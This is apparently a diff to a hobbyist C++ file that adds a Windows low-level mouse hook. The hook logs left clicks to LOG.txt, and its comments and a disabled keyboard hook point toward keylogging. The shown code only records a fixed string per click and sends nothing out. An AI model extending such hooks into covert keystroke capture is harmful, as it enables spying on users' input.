@@ -274,3 +274,94 @@ int main()
 //
 //    UnhookWindowsHookEx(hHock);
 //}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ //------------- Simple Mouse Hook --------------------------------
+
+ #include<Windows.h>
+#include<stdio.h>
+
+using namespace std;
+
+//HHOOK keyboard_hHock = NULL; // Keyboard Hook
+ 
+
+const char* file = "LOG.txt"; // Path to the file where the key logs are saved
+
+
+// Save - Pressed Key ------------------------------------------------------------------------------
+#pragma warning (disable : 4996)
+void SaveKey(const char* key)
+{
+    FILE* outputFile;      
+    outputFile = fopen(file, "a+"); // "a+" = Append Mode
+    fprintf(outputFile, "%s", key);  // "%s" Write the key as string to the file
+    fclose(outputFile);      
+}
+
+
+
+
+
+ //-------------------------------------------------------------------------------------
+
+#include<Windows.h>
+#include <stdio.h>
+
+
+HHOOK hHock = NULL;
+
+LRESULT CALLBACK MyLowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    switch (wParam) {
+    case WM_LBUTTONDOWN:  SaveKey("KEYMOUSE"); break;
+    case WM_RBUTTONDOWN: puts("WM_RBUTTONDOWN"); break;
+    }
+
+    //printf("_a_");
+   
+    return CallNextHookEx(hHock, nCode, wParam, lParam);
+}
+
+int main()
+{
+    MSG msg;
+    hHock = SetWindowsHookEx(WH_MOUSE_LL, MyLowLevelHook, NULL, NULL);
+
+    while (!GetMessage(&msg, NULL, NULL, NULL)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    UnhookWindowsHookEx(hHock);
+}
+
+
